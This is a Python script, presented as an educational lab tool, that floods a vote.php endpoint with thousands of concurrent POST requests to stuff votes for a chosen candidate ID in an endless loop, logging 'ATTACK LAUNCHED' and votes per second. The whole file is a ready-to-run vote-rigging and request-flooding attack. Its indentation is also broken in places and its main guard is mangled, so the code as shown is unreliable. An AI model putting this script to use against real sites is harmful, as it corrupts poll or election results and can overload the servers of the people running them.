# -------------------------------------------------------------------------
# StressTestVoteSystem - RigVotes.py
# Created by: Vinoshan (@Kryrzen)
# Description: Educational lab tool for testing TCP persistence/concurrency.
# License: MIT (See LICENSE file for details)
# -------------------------------------------------------------------------

#Libraries
import asyncio
import aiohttp
import time

# Target Configuration
URL = "http://10.4.34.253/vote.php" # Change to target IP
# Target thats being voted.
CANDIDATE_ID = "9" # Change to fit your Canditate ID
# Number of Connections open at the Same time. 
CONCURRENT = 3000 # [CONCURRENT] Increase or Decrease based on PC Performance.

async def fire_vote(session, semaphore):
# Semaphore is like a bouncer at a club. It ensures only [CONCURRENT] number of tasks run at once to prevent OS crashes.
async with semaphore:
try:
payload = {'candidate_id': CANDIDATE_ID}
# We use "async with" so the script doesn't wait for the server to answer.
# timeout=1.5 ensures we don't hang forever if the server is overwhelmed.
async with session.post(URL, data=payload, timeout=1.5, ssl=False) as resp:
# Return True if the server responded with a "200 OK" status code. HTTP Status Code for saying everything is Okay.
return resp.status == 200
except:
# If there's a timeout or connection error, we catch it here and return False.
return False

async def main():
semaphore = asyncio.Semaphore(CONCURRENT)
# The Connector handles the actual TCP handshakes. 
# Reusing the same connector is what makes this script fast.
connector = aiohttp.TCPConnector(limit=CONCURRENT, ssl=False)

async with aiohttp.ClientSession(connector=connector) as session:
    print(f"[*] ATTACK LAUNCHED: {CONCURRENT} concurrent streams...")
    total_success = 0
    start_time = time.time()
    
    while True:
        # Step 1 - Create a list of [CONCURRENT] "tasks" (but don't run them yet).
        tasks = [fire_vote(session, semaphore) for _ in range(CONCURRENT)]
        results = await asyncio.gather(*tasks)

        # Step 2 - "gather" fires all [CONCURRENT] tasks at once and waits for the batch to finish.
        total_success += sum(1 for r in results if r)
        elapsed = time.time() - start_time
        vps = total_success / elapsed
        # Step 3 - Calculate stats for the dashboard. Visual Indicator of showing if the script is working.
        print(f"[+] Total: {total_success} | Speed: {vps:.2f} votes/sec")
        # Step 4 - A 10ms pause prevents the local CPU from hitting 100% usage.
        await asyncio.sleep(0.01)
        
if name == "main":
try:
# Start the event loop.
asyncio.run(main())
except KeyboardInterrupt:
# Exit when you press Ctrl+C. (Stops the Script)
print("\n[*] Attack stopped by user.")
